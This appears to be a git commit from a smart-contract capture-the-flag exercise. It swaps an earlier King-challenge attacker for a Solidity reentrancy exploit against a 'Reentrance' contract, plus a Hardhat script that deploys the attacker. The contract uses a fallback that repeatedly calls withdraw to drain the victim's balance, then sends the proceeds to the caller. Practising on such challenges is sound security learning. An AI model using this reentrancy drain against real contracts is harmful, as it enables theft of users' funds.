1faef15440cdf5520ab084b001056816a8f43305
wzrdk3lly <dkmk1149@gmail.com>
2022-10-17 14:24:31 -0400

    ADD deploy script

--- contracts/attacker.sol
+++ contracts/attacker.sol
@@ -1,29 +1,38 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "./king.sol";
+import "./reentrency.sol";
 import "hardhat/console.sol";
 
 contract Attacker{
-    King victimContract; //Contractname contractvariable
+    Reentrance victimContract; //Contractname contractvariable
 
-    address payable victimAddress = 0xdC6663C6Df91f4d9e58A59c632c93309c16BFC3F; 
-    event sendPrizeToKing(address indexed senderAddr, uint senderValue);
-    
-    uint256 public balanceToSend;
+    address payable victimAddress = 0x903bdD4bCCDC8F2eF30088fc8c7f8a1070063c99; 
 
     // // // import a contract
     constructor() public {
-        victimContract = King(victimAddress);
+        victimContract = Reentrance(victimAddress);
     }
 
-    function receivePrize() public payable {
-        balanceToSend = msg.value;
-        emit sendPrizeToKing(msg.sender, msg.value);
+     // Call this function first
+    function donateToVictim() public payable {
+        victimContract.donate{value: msg.value}(address(this));// Send a transaction with .002 eth
     }
 
-    function triggerSend() external payable {
-       victimAddress.call.value(balanceToSend)("");
+    // call this funciton second
+    function attack() public {
+       if (address(victimContract).balance >= .002 ether){ // when this is called the contract should have .003 eth
+        victimContract.withdraw(.001 ether); // withdraws the fi
+        }
+    }
+   
+    // call this funciton to claim all the money drained
+    function withdrawToCaller() public {
+        msg.sender.call{value: address(this).balance}("");
+    }
+
+     fallback() external payable {
+       attack();
     }
 
 }
--- scripts/test.ts
+++ scripts/test.ts
@@ -1,44 +1,28 @@
 import { ethers } from "hardhat";
-const CONTRACT_ADDRESS = "0xdC6663C6Df91f4d9e58A59c632c93309c16BFC3F";
+const CONTRACT_ADDRESS = "0x903bdD4bCCDC8F2eF30088fc8c7f8a1070063c99";
 const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
-const ATTACKER_CONTRACT = "0x5C0Dc163901F8844cc5B73a3fbb30fE8ED303DF2";
+const ATTACKER_CONTRACT = "";
 
 async function main() {
   const signer = await ethers.getSigner(PLAYER_ADDRESS);
-  const contract = await ethers.getContractAt("King", CONTRACT_ADDRESS, signer);
-  // const attackerContractFactory = await ethers.getContractFactory(
-  //   "Attacker",
-  //   signer
-  // );
-
-  // const attackerContract = await attackerContractFactory.deploy();
-
-  const attackerContract = await ethers.getContractAt(
-    "Attacker",
-    ATTACKER_CONTRACT,
+  const contract = await ethers.getContractAt(
+    "Reentrance",
+    CONTRACT_ADDRESS,
     signer
   );
-  const valueToSend = "1100000000000000";
+  const attackerContractFactory = await ethers.getContractFactory(
+    "Attacker",
+    signer
+  );
 
-  //deploy attacker contract
-  // console.log("deploy", attackerContract);
+  const attackerContract = await attackerContractFactory.deploy();
 
-  // See what the current prize value is
-  // console.log("the current prize is", await contract.prize());
-
-  // See who the current king is
-  console.log("the current King is", await contract._king());
-
-  // const sendAttackerFundsTX = await attackerContract.receivePrize({
-  //   value: valueToSend,
-  // });
-  // console.log(
-  //   "The transaction where I send attacker funds",
-  //   sendAttackerFundsTX
+  console.log(attackerContract);
+  // const attackerContract = await ethers.getContractAt(
+  //   "Attacker",
+  //   ATTACKER_CONTRACT,
+  //   signer
   // );
-
-  // send the money to the victimContract
-  // console.log(await attackerContract.triggerSend({ gasLimit: 5000000 }));
 }
 
 // We recommend this pattern to be able to use async/await everywhere
